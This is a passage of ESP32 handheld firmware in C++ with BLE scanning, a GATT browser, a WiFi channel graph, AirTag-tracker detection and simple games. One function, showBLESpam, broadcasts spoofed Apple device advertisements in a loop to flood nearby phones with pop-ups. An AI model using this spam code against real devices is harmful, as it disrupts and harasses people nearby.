        String line=String(macBuf).substring(6)+" "+String(trackList[idx].rssi);
        tft.drawString(((idx==sel)?"> ":"  ")+line,2,startY+i*12);
      }
    }
    char k=getKey();
    if (k=='U') { if (trackCount>0) { sel--; if (sel<0) sel=trackCount-1; } }
    else if (k=='D') { if (trackCount>0) { sel++; if (sel>=trackCount) sel=0; } }
    else if (k=='R'||k=='E') break;
    delay(20);
  }
  trackRunning=false;
  esp_wifi_set_promiscuous(false);
  deinitWifi();
}
class MyScanCallbacks : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* dev) override {
    if (dev->haveName()) {
      String name=dev->getName().c_str();
      int rssi=dev->getRSSI();
      String mac=dev->getAddress().toString().c_str();
      for (int i=0;i<bleDeviceCount;i++) if (name.equals(bleDevices[i].name)) { bleDevices[i].rssi=rssi; return; }
      if (bleDeviceCount<MAX_BLE_DEVICES) {
        strncpy(bleDevices[bleDeviceCount].name,name.c_str(),31);
        bleDevices[bleDeviceCount].name[31]='\0';
        bleDevices[bleDeviceCount].rssi=rssi;
        bleDevices[bleDeviceCount].mac[0]=0;
        if (mac.length()>=8) { strncpy(bleDevices[bleDeviceCount].mac,mac.substring(0,8).c_str(),8); bleDevices[bleDeviceCount].mac[8]='\0'; }
        bleAddrCache[bleDeviceCount] = dev->getAddress();
        bleDeviceCount++;
      }
    }
  }
};
void showBLEScan() {
  deinitWifi();
  WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(200);
  clearAll(); titleBar("BLE Scan+");
  NimBLEDevice::init("CakeOS");
  bleDeviceCount=0;
  NimBLEScan* pScan=NimBLEDevice::getScan();
  pScan->setScanCallbacks(new MyScanCallbacks(),false);
  pScan->setActiveScan(true);
  pScan->setInterval(100); pScan->setWindow(99); pScan->start(0);
  bleInited=true;
  int sel=0, off=0;
  unsigned long lastRefresh=millis();
  while (true) {
    if (millis()-lastRefresh>500) {
      lastRefresh=millis();
      clearAll(); titleBar("BLE Devices");
      int startY=14, visible=4;
      if (sel<off) off=sel;
      if (sel>=off+visible) off=sel-visible+1;
      for (int i=0;i<visible && off+i<bleDeviceCount;i++) {
        int idx=off+i;
        String name=String(bleDevices[idx].name);
        if (name.length()==0) name="Unknown";
        String line=name.substring(0,8)+" "+String(bleDevices[idx].mac).substring(0,5)+" "+String(bleDevices[idx].rssi);
        tft.drawString(((idx==sel)?"> ":"  ")+line,2,startY+i*12);
      }
    }
    char k=getKey();
    if (k=='U') { if (bleDeviceCount>0) { sel--; if (sel<0) sel=bleDeviceCount-1; } }
    else if (k=='D') { if (bleDeviceCount>0) { sel++; if (sel>=bleDeviceCount) sel=0; } }
    else if (k=='R'||k=='E') break;
    delay(20);
  }
  pScan->stop(); deinitBLE();
}
struct AppleDevice { const char* name; uint8_t payload[16]; };
const AppleDevice APPLE_DEVICES[] = {
  {"AirPods",   {0x4C,0x00,0x07,0x19,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C}},
  {"AppleTV",   {0x4C,0x00,0x0F,0x05,0xC1,0x01,0x60,0x4C,0x95,0x00,0x00,0x00,0x00,0x00,0x00,0x00}},
  {"AirPlay",   {0x4C,0x00,0x09,0x06,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}},
  {"Handoff",   {0x4C,0x00,0x0C,0x0E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}},
  {"Nearby",    {0x4C,0x00,0x0D,0x0E,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}},
  {"AirTag",    {0x4C,0x00,0x12,0x19,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}}
};
const int APPLE_DEVICE_COUNT = 6;
void showBLESpam() {
  deinitWifi();
  WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(200);
  clearAll(); titleBar("BLE Spam+");
  tft.drawString("Spamming...",2,20);
  NimBLEDevice::init("CakeOS");
  bleInited=true;
  NimBLEAdvertising* pAdv=NimBLEDevice::getAdvertising();
  NimBLEAdvertisementData advData;
  advData.setName(APPLE_DEVICES[0].name);
  advData.setManufacturerData(std::string((const char*)APPLE_DEVICES[0].payload,16));
  pAdv->setAdvertisementData(advData);
  pAdv->setMinInterval(0x20); pAdv->setMaxInterval(0x30);
  pAdv->start();
  int cnt=0, devIdx=0;
  unsigned long lastChange=millis();
  while (true) {
    if (millis()-lastChange>200) {
      lastChange=millis();
      cnt++; devIdx=(devIdx+1)%APPLE_DEVICE_COUNT;
      const AppleDevice& dev=APPLE_DEVICES[devIdx];
      NimBLEAdvertisementData newAdv;
      newAdv.setName(dev.name);
      newAdv.setManufacturerData(std::string((const char*)dev.payload,16));
      pAdv->setAdvertisementData(newAdv);
      pAdv->stop(); delay(2); pAdv->start();
      tft.fillRect(0,40,160,30,TFT_BLACK);
      tft.drawString("Cnt:"+String(cnt),2,40);
      tft.drawString(dev.name,2,52);
    }
    char k=getKey();
    if (k=='R'||k=='E') break;
    delay(10);
  }
  pAdv->stop(); deinitBLE();
}

// ==================== 12. 信道柱状图 ====================
void showChanGraph() {
  deinitWifi();
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Channel Graph", 2, 0);
  unsigned long lastScan = 0;
  bool scanning = false;
  while (true) {
    char k = getKey();
    if (k == 'R' || k == 'E') break;
    if (!scanning && millis() - lastScan > 5000) {
      lastScan = millis();
      WiFi.mode(WIFI_STA);
      WiFi.scanNetworks(true);
      scanning = true;
    }
    if (scanning) {
      int n = WiFi.scanComplete();
      if (n >= 0) {
        scanning = false;
        int chCount[14] = {0};
        for (int i = 0; i < n; i++) {
          int ch = WiFi.channel(i);
          if (ch >= 1 && ch <= 13) chCount[ch]++;
        }
        int maxC = 1;
        for (int c = 1; c <= 13; c++) if (chCount[c] > maxC) maxC = chCount[c];
        tft.fillRect(0, 12, 160, 68, TFT_BLACK);
        char info[24];
        snprintf(info, sizeof(info), "APs:%d  Max:%d", n, maxC);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString(info, 2, 12);
        int baseY = 68, topY = 22;
        int maxH = baseY - topY;
        int barW = 9, gap = 2, startX = 4;
        for (int c = 1; c <= 13; c++) {
          int x = startX + (c - 1) * (barW + gap);
          int h = (chCount[c] * maxH) / maxC;
          if (h < 1) h = 1;
          uint16_t col = (c == 1 || c == 6 || c == 11) ? TFT_GREEN : TFT_BLUE;
          tft.fillRect(x, baseY - h, barW, h, col);
          tft.drawRect(x, baseY - h, barW, h, TFT_WHITE);
          char buf[4]; snprintf(buf, sizeof(buf), "%d", c);
          tft.setTextColor(TFT_WHITE, TFT_BLACK);
          tft.drawCentreString(buf, x + barW/2, baseY + 2, 1);
        }
      }
    }
    delay(20);
  }
  if (wifiConfigured) restartWifi();
}

// ==================== 13. BLE GATT 浏览 ====================
void showBleGatt() {
  deinitWifi();
  WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(200);
  deinitBLE();
  delay(200);
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("BLE GATT", 2, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Scanning 5s...", 2, 20);
  NimBLEDevice::init("CakeOS");
  bleDeviceCount = 0;
  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->setScanCallbacks(new MyScanCallbacks(), false);
  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);
  pScan->start(0);
  unsigned long sStart = millis();
  while (millis() - sStart < 5000) {
    delay(100);
    char k = getKey();
    if (k == 'R' || k == 'E') { pScan->stop(); deinitBLE(); return; }
  }
  pScan->stop();
  if (bleDeviceCount == 0) {
    clearAll(); titleBar("No BLE devices"); deinitBLE(); waitExit(); return;
  }
  int sel = 0, off = 0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Select BLE", 2, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    int startY = 14, visible = 4;
    if (sel < off) off = sel;
    if (sel >= off + visible) off = sel - visible + 1;
    for (int i = 0; i < visible && off + i < bleDeviceCount; i++) {
      int idx = off + i;
      String name = String(bleDevices[idx].name);
      if (name.length() == 0) name = "Unknown";
      String line = name.substring(0, 12) + " " + String(bleDevices[idx].rssi);
      tft.drawString(((idx == sel) ? "> " : "  ") + line, 2, startY + i * 12);
    }
    char k = getKey();
    if (k == 'U') { sel--; if (sel < 0) sel = bleDeviceCount - 1; }
    else if (k == 'D') { sel++; if (sel >= bleDeviceCount) sel = 0; }
    else if (k == 'L') break;
    else if (k == 'R' || k == 'E') { deinitBLE(); return; }
    delay(20);
  }
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Connecting...", 2, 0);
  NimBLEClient* pClient = NimBLEDevice::createClient();
  NimBLEAddress addr = bleAddrCache[sel];
  if (!pClient->connect(addr)) {
    clearAll();
    tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawString("Connect failed", 2, 20);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    NimBLEDevice::deleteClient(pClient);
    deinitBLE();
    waitExit();
    return;
  }
  std::vector<NimBLERemoteService*> services = pClient->getServices(true);
  int svcCount = services.size();
  if (svcCount == 0) {
    clearAll(); tft.drawString("No services", 2, 20);
    pClient->disconnect(); NimBLEDevice::deleteClient(pClient);
    deinitBLE(); waitExit(); return;
  }
  int svcSel = 0, svcOff = 0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    char hdr[24]; snprintf(hdr, sizeof(hdr), "SVC %d/%d", svcSel + 1, svcCount);
    tft.drawString(hdr, 2, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    int startY = 14, visible = 5;
    if (svcSel < svcOff) svcOff = svcSel;
    if (svcSel >= svcOff + visible) svcOff = svcSel - visible + 1;
    auto it = services.begin();
    for (int i = 0; i < svcOff && it != services.end(); i++) it++;
    for (int i = 0; i < visible && it != services.end(); i++) {
      NimBLERemoteService* svc = *it;
      String uuid = svc->getUUID().toString().c_str();
      if (uuid.length() > 18) uuid = uuid.substring(0, 18);
      tft.drawString(((svcSel == svcOff + i) ? "> " : "  ") + uuid, 2, startY + i * 11);
      it++;
    }
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString("R:Disconnect", 2, 74);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char k = getKey();
    if (k == 'U') { svcSel--; if (svcSel < 0) svcSel = svcCount - 1; }
    else if (k == 'D') { svcSel++; if (svcSel >= svcCount) svcSel = 0; }
    else if (k == 'R' || k == 'E') break;
    delay(20);
  }
  pClient->disconnect();
  NimBLEDevice::deleteClient(pClient);
  deinitBLE();
}

// ==================== 14. 反跟踪器检测 ====================
#define MAX_TRACKERS 10
struct TrackerHit { char mac[18]; int rssi; unsigned long lastSeen; };
TrackerHit trackerList[MAX_TRACKERS];
int trackerCount = 0;
volatile bool trackerRunning = false;

class TrackerScanCallbacks : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* dev) override {
    if (!trackerRunning) return;
    if (dev->haveManufacturerData()) {
      std::string mfg = dev->getManufacturerData();
      if (mfg.length() >= 4 &&
          (uint8_t)mfg[0] == 0x4C && (uint8_t)mfg[1] == 0x00 &&
          (uint8_t)mfg[2] == 0x12 && (uint8_t)mfg[3] == 0x19) {
        String mac = dev->getAddress().toString().c_str();
        int rssi = dev->getRSSI();
        for (int i = 0; i < trackerCount; i++) {
          if (mac.equals(trackerList[i].mac)) {
            trackerList[i].rssi = rssi;
            trackerList[i].lastSeen = millis();
            return;
          }
        }
        if (trackerCount < MAX_TRACKERS) {
          strncpy(trackerList[trackerCount].mac, mac.c_str(), 17);
          trackerList[trackerCount].mac[17] = '\0';
          trackerList[trackerCount].rssi = rssi;
          trackerList[trackerCount].lastSeen = millis();
          trackerCount++;
        }
      }
    }
  }
};

void showTrackerDetect() {
  deinitWifi();
  WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(200);
  deinitBLE();
  delay(200);
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Tracker Detect", 2, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Scanning...", 2, 20);
  NimBLEDevice::init("CakeOS");
  trackerCount = 0;
  trackerRunning = true;
  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->setScanCallbacks(new TrackerScanCallbacks(), false);
  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);
  pScan->start(0);
  int sel = 0, off = 0;
  unsigned long lastRefresh = millis();
  while (true) {
    if (millis() - lastRefresh > 500) {
      lastRefresh = millis();
      clearAll();
      char hdr[24]; snprintf(hdr, sizeof(hdr), "Trackers: %d", trackerCount);
      tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString(hdr, 2, 0);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      int startY = 14, visible = 4;
      if (sel < off) off = sel;
      if (sel >= off + visible) off = sel - visible + 1;
      for (int i = 0; i < visible && off + i < trackerCount; i++) {
        int idx = off + i;
        String mac = String(trackerList[idx].mac).substring(9);
        String line = mac + " " + String(trackerList[idx].rssi);
        tft.drawString(((idx == sel) ? "> " : "  ") + line, 2, startY + i * 12);
      }
      if (trackerCount == 0) {
        tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
        tft.drawString("No tracker found", 2, 30);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
      }
    }
    char k = getKey();
    if (k == 'U') { if (trackerCount > 0) { sel--; if (sel < 0) sel = trackerCount - 1; } }
    else if (k == 'D') { if (trackerCount > 0) { sel++; if (sel >= trackerCount) sel = 0; } }
    else if (k == 'R' || k == 'E') break;
    delay(20);
  }
  trackerRunning = false;
  pScan->stop();
  deinitBLE();
}

// 第二段从这里开始（Tetris 起）
// ==================== Tetris ====================
int tetrisGrid[20][10];
int pieceX, pieceY, pieceType, pieceRot;
const int TET_X=30, TET_Y=10, TET_CELL_W=5, TET_CELL_H=3;
const int pieces[7][4][4] = {
  {{1,1,1,1},{0,0,0,0},{0,0,0,0},{0,0,0,0}},{{1,1,1,0},{1,0,0,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,1,0},{0,0,1,0},{0,0,0,0},{0,0,0,0}},{{1,1,0,0},{1,1,0,0},{0,0,0,0},{0,0,0,0}},
  {{0,1,1,0},{1,1,0,0},{0,0,0,0},{0,0,0,0}},{{1,1,0,0},{0,1,1,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,1,0},{0,1,0,0},{0,0,0,0},{0,0,0,0}}
};
bool getShapeCell(int type, int rot, int row, int col) {
  int r=row, c=col;
  for (int k=0;k<rot;k++) { int t=r; r=3-c; c=t; }
  if (r<0||r>3||c<0||c>3) return false;
  return pieces[type][r][c]!=0;
}
void tetrisInit() {
  for (int y=0;y<20;y++) for (int x=0;x<10;x++) tetrisGrid[y][x]=0;
  pieceType=random(7); pieceRot=0; pieceX=3; pieceY=0;
}
bool tetrisCollide(int x, int y, int rot) {
  for (int i=0;i<4;i++) for (int j=0;j<4;j++) {
    if (getShapeCell(pieceType,rot,i,j)) {
      int gx=x+j, gy=y+i;
      if (gx<0||gx>=10||gy>=20) return true;
      if (gy>=0 && tetrisGrid[gy][gx]) return true;
    }
  }
  return false;
}
bool tryRotate() {
  int newRot=(pieceRot+1)%4;
  int offsets[5]; int oc=0;
  if (pieceType==0) {
    if (pieceRot==0) { offsets[oc++]=2; offsets[oc++]=1; offsets[oc++]=-1; offsets[oc++]=-2; offsets[oc++]=0; }
    else if (pieceRot==1) { offsets[oc++]=-2; offsets[oc++]=-1; offsets[oc++]=1; offsets[oc++]=2; offsets[oc++]=0; }
    else if (pieceRot==2) { offsets[oc++]=-2; offsets[oc++]=-1; offsets[oc++]=1; offsets[oc++]=2; offsets[oc++]=0; }
    else { offsets[oc++]=2; offsets[oc++]=1; offsets[oc++]=-1; offsets[oc++]=-2; offsets[oc++]=0; }
  } else { offsets[oc++]=0; offsets[oc++]=-1; offsets[oc++]=1; offsets[oc++]=-2; offsets[oc++]=2; }
  for (int i=0;i<oc;i++) if (!tetrisCollide(pieceX+offsets[i],pieceY,newRot)) { pieceX+=offsets[i]; pieceRot=newRot; return true; }
  return false;
}
void tetrisDrawFrameColor(uint16_t color) {
  int bx=TET_X-3, by=TET_Y-3, bw=10*TET_CELL_W+6, bh=20*TET_CELL_H+6;
  tft.drawRoundRect(bx,by,bw,bh,4,TFT_WHITE);
  tft.drawRoundRect(bx+1,by+1,bw-2,bh-2,4,TFT_DARKGREY);
}
void tetrisDrawColor(uint16_t blockColor) {
  tft.fillRect(TET_X,TET_Y,10*TET_CELL_W,20*TET_CELL_H,TFT_BLACK);
  for (int y=0;y<20;y++) for (int x=0;x<10;x++)
    if (tetrisGrid[y][x]) tft.fillRect(TET_X+x*TET_CELL_W,TET_Y+y*TET_CELL_H,TET_CELL_W,TET_CELL_H,blockColor);
  for (int i=0;i<4;i++) for (int j=0;j<4;j++)
    if (getShapeCell(pieceType,pieceRot,i,j)) tft.fillRect(TET_X+(pieceX+j)*TET_CELL_W,TET_Y+(pieceY+i)*TET_CELL_H,TET_CELL_W,TET_CELL_H,blockColor);
  tetrisDrawFrameColor(blockColor);
}
void tetrisClear() {
  for (int y=19;y>=0;y--) {
    bool full=true;
    for (int x=0;x<10;x++) if (!tetrisGrid[y][x]) { full=false; break; }
    if (full) { for (int yy=y;yy>0;yy--) for (int x=0;x<10;x++) tetrisGrid[yy][x]=tetrisGrid[yy-1][x]; y++; }
  }
}
void tetShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN,TFT_BLACK); tft.drawCentreString("Records",80,4,1);
  tft.setTextColor(TFT_WHITE,TFT_BLACK);
  tft.drawString("Best Score:",4,24); tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString(String(tetData.bestScore),4,38);
  tft.setTextColor(TFT_WHITE,TFT_BLACK); tft.drawString("Best Lines:",4,54);
  tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString(String(tetData.bestLines),4,68);
  tft.setTextColor(TFT_WHITE,TFT_BLACK); waitExit();
}
void tetShowShop() {
  int sel=0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN,TFT_BLACK); tft.drawString("Shop",2,0);
    tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString("$"+String(pet2.coins),120,0);
    tft.setTextColor(TFT_WHITE,TFT_BLACK);
    for (int i=0;i<TET_SKIN_COUNT;i++) {
      int y=14+i*11;
      bool owned=(tetData.ownedSkins>>i)&1;
      bool current=(tetData.currentSkin==i);
      String line=((i==sel)?"> ":"  ")+String(TET_SKINS[i].name);
      if (current) line+=" *"; else if (!owned) line+=" $"+String(TET_SKINS[i].cost); else line+=" (owned)";
      if (i==sel) tft.setTextColor(TFT_YELLOW,TFT_BLACK); else tft.setTextColor(TET_SKINS[i].color,TFT_BLACK);
      tft.drawString(line,2,y);
    }
    char k=getKey();
    if (k=='U') sel=(sel+TET_SKIN_COUNT-1)%TET_SKIN_COUNT;
    else if (k=='D') sel=(sel+1)%TET_SKIN_COUNT;
    else if (k=='L') {
      bool owned=(tetData.ownedSkins>>sel)&1;
      if (owned) { tetData.currentSkin=sel; tetSave(); }
      else if (pet2.coins>=TET_SKINS[sel].cost) {
        pet2.coins-=TET_SKINS[sel].cost; tetData.ownedSkins|=(1<<sel); tetData.currentSkin=sel;
        pet2Save(); tetSave();
      }
    } else if (k=='R'||k=='E') break;
    delay(30);
  }
}
void tetGamePlay() {
  clearAll();
  tft.setTextColor(TFT_WHITE,TFT_BLACK); tft.drawString("Tetris",2,0);
  uint16_t blockColor=TET_SKINS[tetData.currentSkin].color;
  int score=0, lines=0;
  tetrisInit(); tetrisDrawFrameColor(blockColor);
  unsigned long lastFall=millis(); int fallSpeed=500;
  while (true) {
    char k=getTetrisKey();
    if (k=='U') { if (!tetrisCollide(pieceX-1,pieceY,pieceRot)) pieceX--; }
    else if (k=='D') { if (!tetrisCollide(pieceX+1,pieceY,pieceRot)) pieceX++; }
    else if (k=='L') tryRotate();
    else if (k=='R') { while (!tetrisCollide(pieceX,pieceY+1,pieceRot)) pieceY++; }
    else if (k=='E') break;
    if (millis()-lastFall>(unsigned long)fallSpeed) {
      lastFall=millis();
      if (!tetrisCollide(pieceX,pieceY+1,pieceRot)) pieceY++;
      else {
        for (int i=0;i<4;i++) for (int j=0;j<4;j++)
          if (getShapeCell(pieceType,pieceRot,i,j)) {
            int gy=pieceY+i, gx=pieceX+j;
            if (gy>=0 && gy<20 && gx>=0 && gx<10) tetrisGrid[gy][gx]=1;
          }
        int before=0; for (int y=0;y<20;y++) for (int x=0;x<10;x++) if (tetrisGrid[y][x]) before++;
        tetrisClear();
        int after=0; for (int y=0;y<20;y++) for (int x=0;x<10;x++) if (tetrisGrid[y][x]) after++;
        int cleared=(before-after)/10;
        score+=cleared*10; lines+=cleared;
        if (lines>0 && lines%5==0 && fallSpeed>150) fallSpeed-=50;
        pieceType=random(7); pieceRot=0; pieceX=3; pieceY=0;
        if (tetrisCollide(pieceX,pieceY,pieceRot)) {
          if (score>tetData.bestScore) tetData.bestScore=score;
          if (lines>tetData.bestLines) tetData.bestLines=lines;
          tetSave();
          gameReward(score/30+2);
          pet2TaskAdd(6,1); pet2TaskSet(7,score);
          clearAll();
          tft.setTextColor(TFT_RED,TFT_BLACK); tft.drawCentreString("GAME OVER",80,8,1);
          tft.setTextColor(TFT_WHITE,TFT_BLACK);
          tft.drawString("Score: "+String(score),4,28);
          tft.drawString("Lines: "+String(lines),4,42);
          while (true) { char kk=getKey(); if (kk=='R'||kk=='E') break; delay(20); }
          return;
        }
      }
    }
    tetrisDrawColor(blockColor);
    tft.fillRect(90,10,68,12,TFT_BLACK); tft.drawString("S:"+String(score),90,10);
    tft.fillRect(90,22,68,12,TFT_BLACK); tft.drawString("L:"+String(lines),90,22);
    delay(15);
  }
}
void showTetris() {
  deinitWifi(); deinitBLE();
  tetLoad();
  int menuSel=0; bool inMenu=true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE,TFT_BLACK); tft.drawString("Tetris",2,0);
    tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString("$"+String(pet2.coins),130,0);
    tft.setTextColor(TFT_WHITE,TFT_BLACK);
    const char* items[]={"Start","Records","Shop"};
    for (int i=0;i<3;i++) { String pre=(i==menuSel)?"> ":"  "; tft.drawString(pre+items[i],2,20+i*14); }
    char k=getKey();
    if (k=='U') menuSel=(menuSel+2)%3;
    else if (k=='D') menuSel=(menuSel+1)%3;
    else if (k=='L') {
      if (menuSel==0) tetGamePlay();
      else if (menuSel==1) tetShowRecords();
      else if (menuSel==2) tetShowShop();
      tetLoad();
    } else if (k=='R'||k=='E') inMenu=false;
    delay(30);
  }
}

// Breakout —— 用肉鸽式左右移动（按住上键持续左移，按住下键持续右移）
void brkShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN,TFT_BLACK); tft.drawCentreString("Records",80,4,1);
  tft.setTextColor(TFT_WHITE,TFT_BLACK);
  tft.drawString("Best Score:",4,24); tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString(String(brkData.bestScore),4,38);
  tft.setTextColor(TFT_WHITE,TFT_BLACK); tft.drawString("Best Bricks:",4,54);
  tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString(String(brkData.bestBricks),4,68);
  tft.setTextColor(TFT_WHITE,TFT_BLACK); waitExit();
}
void brkShowShop() {
  int sel=0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN,TFT_BLACK); tft.drawString("Shop",2,0);
    tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString("$"+String(pet2.coins),120,0);
    tft.setTextColor(TFT_WHITE,TFT_BLACK);
    for (int i=0;i<BRK_SKIN_COUNT;i++) {
      int y=14+i*11;
      bool owned=(brkData.ownedSkins>>i)&1;
      bool current=(brkData.currentSkin==i);
      String line=((i==sel)?"> ":"  ")+String(BRK_SKINS[i].name);
      if (current) line+=" *"; else if (!owned) line+=" $"+String(BRK_SKINS[i].cost); else line+=" (owned)";
      if (i==sel) tft.setTextColor(TFT_YELLOW,TFT_BLACK); else tft.setTextColor(BRK_SKINS[i].brickColor,TFT_BLACK);
      tft.drawString(line,2,y);
    }
    char k=getKey();
    if (k=='U') sel=(sel+BRK_SKIN_COUNT-1)%BRK_SKIN_COUNT;
    else if (k=='D') sel=(sel+1)%BRK_SKIN_COUNT;
    else if (k=='L') {
      bool owned=(brkData.ownedSkins>>sel)&1;
      if (owned) { brkData.currentSkin=sel; brkSave(); }
      else if (pet2.coins>=BRK_SKINS[sel].cost) {
        pet2.coins-=BRK_SKINS[sel].cost; brkData.ownedSkins|=(1<<sel); brkData.currentSkin=sel;
        pet2Save(); brkSave();
      }
    } else if (k=='R'||k=='E') break;
    delay(30);
  }
}
void brkGamePlay() {
  clearAll();
  tft.setTextColor(TFT_WHITE,TFT_BLACK); tft.drawString("Breakout",2,0);
  uint16_t brickColor=BRK_SKINS[brkData.currentSkin].brickColor;
  uint16_t ballColor=BRK_SKINS[brkData.currentSkin].ballColor;
  int paddleX=60, ballX=80, ballY=70;
  int ballDX=1, ballDY=-1;
  bool ballMoving=false;
  bool bricks[4][8];
  for (int i=0;i<4;i++) for (int j=0;j<8;j++) bricks[i][j]=true;
  int score=0, bricksBroken=0;
  while (true) {
    if (digitalRead(BTN_UP)   == LOW) paddleX -= 4;
    if (digitalRead(BTN_DOWN) == LOW) paddleX += 4;

    char k = getGameKey();
    if (k == 'L') { if (!ballMoving) { ballMoving=true; ballX=paddleX+10; ballY=70; ballDX=1; ballDY=-1; } }
    else if (k == 'E') break;

    if (paddleX<0) paddleX=0;
    if (paddleX>140) paddleX=140;
    if (ballMoving) {
      ballX+=ballDX; ballY+=ballDY;
      if (ballX<=0||ballX>=158) ballDX=-ballDX;
      if (ballY<=12) ballDY=-ballDY;
      if (ballY>=70 && ballX>=paddleX && ballX<=paddleX+20) ballDY=-ballDY;
      if (ballY>80) { ballMoving=false; ballX=paddleX+10; ballY=70; }
      for (int i=0;i<4;i++) for (int j=0;j<8;j++)
        if (bricks[i][j]) {
          int bx=j*20, by=14+i*8;
          if (ballX>=bx && ballX<=bx+18 && ballY>=by && ballY<=by+6) { bricks[i][j]=false; ballDY=-ballDY; score++; bricksBroken++; }
        }
    } else { ballX=paddleX+10; ballY=70; }
    bool allBroken=true;
    for (int i=0;i<4;i++) for (int j=0;j<8;j++) if (bricks[i][j]) { allBroken=false; break; }
    if (allBroken) {
      if (score>brkData.bestScore) brkData.bestScore=score;
      if (bricksBroken>brkData.bestBricks) brkData.bestBricks=bricksBroken;
      brkSave();
      gameReward(score/5+5);
      pet2Unlock(7); pet2TaskAdd(6,1); pet2TaskSet(7,score);
      clearAll();
      tft.setTextColor(TFT_GREEN,TFT_BLACK); tft.drawCentreString("WIN!",80,8,1);
      tft.setTextColor(TFT_WHITE,TFT_BLACK);
      tft.drawString("Score: "+String(score),4,28);
      tft.drawString("Bricks: "+String(bricksBroken),4,42);
      while (true) { char kk=getKey(); if (kk=='R'||kk=='E') break; delay(20); }
      return;
    }
    tft.fillScreen(TFT_BLACK);
    tft.drawString("Score:"+String(score),2,0);
    tft.fillRect(paddleX,72,20,4,TFT_WHITE);
    tft.fillCircle(ballX,ballY,2,ballColor);
    for (int i=0;i<4;i++) for (int j=0;j<8;j++)
      if (bricks[i][j]) tft.fillRect(j*20,14+i*8,18,6,brickColor);
    delay(12);
  }
}
void showBreakout() {
  deinitWifi(); deinitBLE();
  brkLoad();
  int menuSel=0; bool inMenu=true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE,TFT_BLACK); tft.drawString("Breakout",2,0);
    tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString("$"+String(pet2.coins),130,0);
    tft.setTextColor(TFT_WHITE,TFT_BLACK);
    const char* items[]={"Start","Records","Shop"};
    for (int i=0;i<3;i++) { String pre=(i==menuSel)?"> ":"  "; tft.drawString(pre+items[i],2,20+i*14); }
    char k=getKey();
    if (k=='U') menuSel=(menuSel+2)%3;
    else if (k=='D') menuSel=(menuSel+1)%3;
    else if (k=='L') {
      if (menuSel==0) brkGamePlay();
      else if (menuSel==1) brkShowRecords();
      else if (menuSel==2) brkShowShop();
      brkLoad();
    } else if (k=='R'||k=='E') inMenu=false;
    delay(30);
  }
}

void showSnake() {
  deinitWifi(); deinitBLE();
  clearAll();
  tft.setTextColor(TFT_WHITE,TFT_BLACK);
  tft.drawString("Snake",2,0);
  tft.drawRoundRect(0,13,160,67,3,TFT_DARKGREEN);
  const int CELL=5, COLS=32, ROWS=12, OX=0, OY=15;
  int snakeX[200], snakeY[200];
  int snakeLen=3, dir=1;
  snakeX[0]=5; snakeY[0]=6; snakeX[1]=4; snakeY[1]=6; snakeX[2]=3; snakeY[2]=6;
  int foodX=20, foodY=6;
  int score=0;
  unsigned long lastMove=millis();
  int moveInterval=280;
  while (true) {
    char k=getSnakeKey();
    if (k=='U') dir=(dir+3)%4;
    else if (k=='D') dir=(dir+1)%4;
    else if (k=='R') break;
    if (millis()-lastMove>moveInterval) {
      lastMove=millis();
      int nx=snakeX[0], ny=snakeY[0];
      switch (dir) { case 0: ny--; break; case 1: nx++; break; case 2: ny++; break; case 3: nx--; break; }
      bool dead=false;
      if (nx<0||nx>=COLS||ny<0||ny>=ROWS) dead=true;
